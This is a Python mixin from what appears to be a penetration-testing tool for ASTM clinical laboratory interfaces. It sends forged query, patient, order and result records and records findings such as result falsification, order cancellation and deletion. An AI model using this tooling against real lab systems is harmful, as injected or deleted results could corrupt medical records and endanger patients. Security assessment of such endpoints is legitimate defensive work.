"""
ASTM Records Mixin

Handles sending Query, Patient, Order, and Result records.
"""


class RecordsMixin:
    """Mixin providing ASTM record operations."""

    def _send_query_record(self):
        """Send Q (Query) record"""
        self.logger.display("Sending Q (Query) record...")

        if not self._send_enq():
            self.logger.warning("ENQ failed before query")
            return

        # Build header
        header = self.record_builder.build_header(
            sender_name=getattr(self.args, "sender_name", "OIDA"),
        )
        if not self._send_frame(header):
            self.logger.warning("Header rejected")
            self._send_eot()
            return

        # Build query record
        patient_id = getattr(self.args, "patient_id", "") or ""
        order_id = getattr(self.args, "order_id", "") or ""
        test_id = getattr(self.args, "test_id", "") or ""

        query = self.record_builder.build_query(
            starting_range=patient_id or order_id or "*",
            universal_test_id=test_id,
            nature_of_request="A",  # All info
        )

        if self._send_frame(query):
            self.logger.success("Query record accepted")
            self.results["data"]["query_accepted"] = True

            # Security finding
            self.results["data"].setdefault("security_findings", []).append(
                {
                    "severity": "MEDIUM",
                    "operation": "Query",
                    "issue": "Query Access Available",
                    "description": "Endpoint accepts query records from unknown sender",
                }
            )
        else:
            self.logger.warning("Query record rejected")
            self.results["data"]["query_accepted"] = False

        # Terminator and EOT
        terminator = self.record_builder.build_terminator()
        self._send_frame(terminator)
        self._send_eot()

    def _send_patient_record(self):
        """Send P (Patient) record"""
        self.logger.display("Sending P (Patient) record...")

        if not self._send_enq():
            self.logger.warning("ENQ failed")
            return

        header = self.record_builder.build_header(
            sender_name=getattr(self.args, "sender_name", "OIDA"),
        )
        if not self._send_frame(header):
            self._send_eot()
            return

        # Build patient record with test data
        patient = self.record_builder.build_patient(
            patient_id=getattr(self.args, "patient_id", "") or "TEST001",
            patient_name=getattr(self.args, "patient_name", "") or "TEST^PATIENT",
        )

        if self._send_frame(patient):
            self.logger.success("Patient record accepted - PATIENT INJECTION POSSIBLE")
            self.results["data"]["patient_accepted"] = True
            self.results["data"].setdefault("security_findings", []).append(
                {
                    "severity": "HIGH",
                    "operation": "Patient",
                    "issue": "Patient Injection Possible",
                    "description": "Endpoint accepts patient records - forged patient "
                    "demographics can be injected into the LIS",
                }
            )
        else:
            self.logger.warning("Patient record rejected")

        terminator = self.record_builder.build_terminator()
        self._send_frame(terminator)
        self._send_eot()

    def _send_order_record(self):
        """Send O (Order) record - DANGEROUS"""
        # Determine action code
        action_code = getattr(self.args, "action_code", "N") or "N"
        if getattr(self.args, "cancel_order", False):
            action_code = "C"

        action_desc = {
            "N": "NEW ORDER",
            "A": "ADD TO ORDER",
            "C": "CANCEL ORDER",
            "P": "PENDING ORDER",
            "R": "REQUEST ORDER",
            "X": "DELETE ORDER",
        }.get(action_code, action_code)

        self.logger.display(f"Sending O (Order) record - Action: {action_desc}")
        self.logger.warning("This is a DANGEROUS operation - may modify lab orders")

        if not self._send_enq():
            return

        header = self.record_builder.build_header(
            sender_name=getattr(self.args, "sender_name", "") or "OIDA",
        )
        if not self._send_frame(header):
            self._send_eot()
            return

        # Patient record (required before order)
        patient = self.record_builder.build_patient(
            patient_id=getattr(self.args, "patient_id", "") or "TEST001",
        )
        self._send_frame(patient)

        # Order record with action code
        priority = getattr(self.args, "priority", "R") or "R"
        order = self.record_builder.build_order(
            sample_id=getattr(self.args, "sample_id", "") or "SAMPLE001",
            test_id=getattr(self.args, "test_id", "") or "CBC",
            priority=priority,
            action_code=action_code,
        )

        if self._send_frame(order):
            if action_code == "C":
                self.logger.success("Order CANCEL accepted - ORDER CANCELLATION POSSIBLE")
                issue = "Order Cancellation Possible"
                desc = "Endpoint accepts order cancellation - can disrupt pending tests"
            elif action_code == "X":
                self.logger.success("Order DELETE accepted - ORDER DELETION POSSIBLE")
                issue = "Order Deletion Possible"
                desc = "Endpoint accepts order deletion - can remove test orders"
            else:
                self.logger.success("Order record accepted - ORDER INJECTION POSSIBLE")
                issue = "Order Injection Possible"
                desc = "Endpoint accepts order records - test orders can be injected"

            self.results["data"]["order_accepted"] = True
            self.results["data"]["order_action"] = action_code
            self.results["data"].setdefault("security_findings", []).append(
                {
                    "severity": "CRITICAL",
                    "operation": f"Order ({action_desc})",
                    "issue": issue,
                    "description": desc,
                }
            )
        else:
            self.logger.display("Order record rejected")

        terminator = self.record_builder.build_terminator()
        self._send_frame(terminator)
        self._send_eot()

    def _send_result_record(self):
        """Send R (Result) record - DANGEROUS"""
        # Determine result status
        result_status = getattr(self.args, "result_status", "F") or "F"
        if getattr(self.args, "correct_result", False):
            result_status = "C"
        elif getattr(self.args, "delete_result", False):
            result_status = "X"

        status_desc = {
            "P": "PRELIMINARY",
            "F": "FINAL",
            "C": "CORRECTED",
            "X": "CANCELED/DELETED",
            "I": "INCOMPLETE",
            "S": "PARTIAL",
            "M": "MANUAL",
            "R": "RERUN",
            "N": "NOT VERIFIED",
            "W": "WRONG",
        }.get(result_status, result_status)

        self.logger.display(f"Sending R (Result) record - Status: {status_desc}")
        self.logger.warning("This is a DANGEROUS operation - may modify lab results")

        if not self._send_enq():
            return

        header = self.record_builder.build_header(
            sender_name=getattr(self.args, "sender_name", "") or "OIDA",
        )
        if not self._send_frame(header):
            self._send_eot()
            return

        # Patient record
        patient = self.record_builder.build_patient(
            patient_id=getattr(self.args, "patient_id", "") or "TEST001",
        )
        self._send_frame(patient)

        # Order record
        order = self.record_builder.build_order(
            sample_id=getattr(self.args, "sample_id", "") or "SAMPLE001",
            test_id=getattr(self.args, "test_id", "") or "GLU",
        )
        self._send_frame(order)

        # Result record with status and additional fields
        units = getattr(self.args, "result_units", "") or "mg/dL"
        ref_range = getattr(self.args, "reference_range", "") or ""
        abnormal_flag = getattr(self.args, "abnormal_flag", "") or ""

        result = self.record_builder.build_result(
            test_id=getattr(self.args, "test_id", "") or "GLU",
            value=getattr(self.args, "result_value", "") or "100",
            units=units,
            reference_range=ref_range,
            abnormal_flag=abnormal_flag,
            result_status=result_status,
        )

        if self._send_frame(result):
            if result_status == "C":
                self.logger.success("Result CORRECTION accepted - RESULT MODIFICATION POSSIBLE")
                issue = "Result Correction Possible"
                desc = "Endpoint accepts corrected results - existing results can be modified"
            elif result_status == "X":
                self.logger.success("Result DELETION accepted - RESULT DELETION POSSIBLE")
                issue = "Result Deletion Possible"
                desc = "Endpoint accepts result deletion - lab results can be removed"
            else:
                self.logger.success("Result record accepted - RESULT INJECTION POSSIBLE")
                issue = "Result Injection Possible"
                desc = "Endpoint accepts result records - lab results can be falsified"

            self.results["data"]["result_accepted"] = True
            self.results["data"]["result_status"] = result_status
            self.results["data"]["result_value"] = getattr(self.args, "result_value", "") or "100"
            self.results["data"].setdefault("security_findings", []).append(
                {
                    "severity": "CRITICAL",
                    "operation": f"Result ({status_desc})",
                    "issue": issue,
                    "description": desc,
                }
            )
        else:
            self.logger.display("Result record rejected")

        terminator = self.record_builder.build_terminator()
        self._send_frame(terminator)
        self._send_eot()
